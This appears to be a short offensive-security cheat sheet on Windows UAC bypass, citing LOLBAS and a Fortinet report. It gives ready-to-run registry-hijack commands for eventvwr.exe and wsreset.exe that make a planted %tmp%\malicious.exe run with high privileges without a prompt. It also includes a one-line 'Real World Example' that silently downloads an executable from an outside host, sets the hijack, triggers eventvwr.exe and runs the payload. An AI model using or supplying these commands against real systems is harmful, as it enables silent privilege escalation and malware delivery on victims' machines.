# User Access Controls Bypass
## eventvwr.exe
https://lolbas-project.github.io/lolbas/Binaries/Eventvwr/#uac%20bypass
https://www.fortinet.com/blog/threat-research/malicious-macro-bypasses-uac-to-elevate-privilege-for-fareit-malware

Prep: 
```
reg add HKCU\Software\Classes\mscfile\shell\open\command /d %tmp%\malicious.exe /f
```
During startup, eventvwr.exe checks the registry value HKCU\Software\Classes\mscfile\shell\open\command for the location of mmc.exe, which is used to open the eventvwr.msc saved console file. If the location of another binary or script is added to this registry value, it will be executed as a high-integrity process without a UAC prompt being displayed to the user.

Real World Example: 
```
cmd.exe /c powershell.exe -w hidden -nop -ep bypass (New-Object System.Net.WebClient).DownloadFile('http://walmare.com/downloads/malicious.exe','%TEMP%\malicious.exe') & reg add HKCU\Software\Classes\mscfile\shell\open\command /d %tmp%\malicious.exe /f & C:\Windows\system32\eventvwr.exe & ping -n 15 124.0.0.1>nul & %tmp%\malicious.exe
```

## wsreset.exe
https://lolbas-project.github.io/lolbas/Binaries/Wsreset/#uac%20bypass

Prep: 
```
reg add HKCU\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command /d %tmp%\malicious.exe /f
```
During startup, wsreset.exe checks the registry value HKCU\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command for the command to run. Binary will be executed as a high-integrity process without a UAC prompt being displayed to the user.
```
HKCU\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command
```



